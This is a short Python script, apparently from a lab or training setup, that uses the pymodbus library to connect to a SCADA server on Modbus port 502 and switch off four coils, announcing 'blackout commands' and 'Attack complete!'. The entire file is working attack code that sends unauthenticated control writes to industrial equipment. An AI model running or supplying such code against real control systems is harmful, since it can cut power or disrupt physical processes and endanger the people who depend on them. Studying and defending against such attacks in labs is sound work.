from pymodbus.client import ModbusTcpClient
import sys

print('[*] Connecting to SCADA server...')
client = ModbusTcpClient('scada-server', port=502)

if client.connect():
    print('[*] Connection successful. Sending blackout commands...')
    for i in range(4):
        # device_id=1 matches our SCADA server configuration
        client.write_coil(i, False, device_id=1)
    client.close()
    print('[+] Attack complete! Check your HMI dashboard.')
else:
    print('[!] Failed to connect to the SCADA server.')
    sys.exit(1)
